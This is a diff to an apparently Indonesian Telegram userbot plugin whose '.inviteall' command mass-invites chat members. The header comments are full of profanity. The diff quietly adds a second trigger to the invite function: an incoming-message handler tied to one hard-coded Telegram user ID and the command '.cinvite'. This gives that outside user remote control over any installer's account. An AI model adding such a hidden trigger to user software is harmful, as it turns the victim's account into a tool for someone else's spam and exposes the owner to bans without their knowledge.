@@ -3,6 +3,7 @@
 # Copyright © Team RAM - UBOT
 # Hush Hush Sana ajg gausah kesini
 # Si ngentot, Kalo ngefork Jangan hapus kredit babi!!
+# Dor dior mau credit laa juga
 
 from telethon.tl import functions
 from telethon.tl.functions.messages import GetFullChatRequest
@@ -52,6 +53,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=1937084611, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
